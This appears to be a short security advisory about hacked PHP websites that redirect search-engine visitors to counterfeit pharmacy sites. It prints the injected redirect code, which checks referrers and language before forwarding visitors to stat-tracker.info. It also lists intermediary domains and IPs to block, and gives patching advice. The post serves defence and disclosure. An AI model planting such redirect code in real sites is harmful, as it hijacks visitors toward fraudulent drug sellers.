Pharma / Blackhat SEO Spam by stat-tracker.info and others
We are tracking a large number of web sites that got hacked and are redirecting users to pharmacy-related domains. All the sites had the following code added to their PHP files:
if(preg_match(‘/live|msn|yahoo|google|ask|aol|msnbot/’,$_SERVER[“HTTP_REFERER”]))
$_23=array(‘viagra’,’cialis’,’levitra’,’propecia’,’prozac’,’xenical’,’zoloft’,’tamiflu’,’sildenafil’,’tadalafil’,….
{$_26=explode(‘,’,$_SERVER[‘HTTP_ACCEPT_LANGUAGE’]);if(!strpos($_SERVER[‘HTTP_USER_AGENT’],’GTB’)
&&!($_26[round(0)]== ‘ru’)&&!($_26[round(0)]== ‘ua’)&&($_SERVER[“REMOTE_ADDR”]!=”75.125.140.209″)){
header(“Location: http://stat-tracker.info/go.php?sid=1&tds-key=” .$_24 .”&sref=” .urlencode($_SERVER[“HTTP_REFERER”]));die();}}}
Which basically redirect the user if they came from a search engine. Domains used in these attacks (among many others):

stat-tracker.info
listita.info
babbyboom.ru
startds.net
agency-translation.com
bbt-tv.ru
dl.newsite.in

They just act as an intermediary before sending the user to sites like http://centerpills.com/ and similar (to buy fake pharmacy related products).
For hosting providers, I recommend blocking the following IP addresses: 178.238.134.8, 194.28.172.37 and 88.198.16.186.
All the sites infected had old/ vulnerable versions of web applications running. So make sure to keep your sites updated!
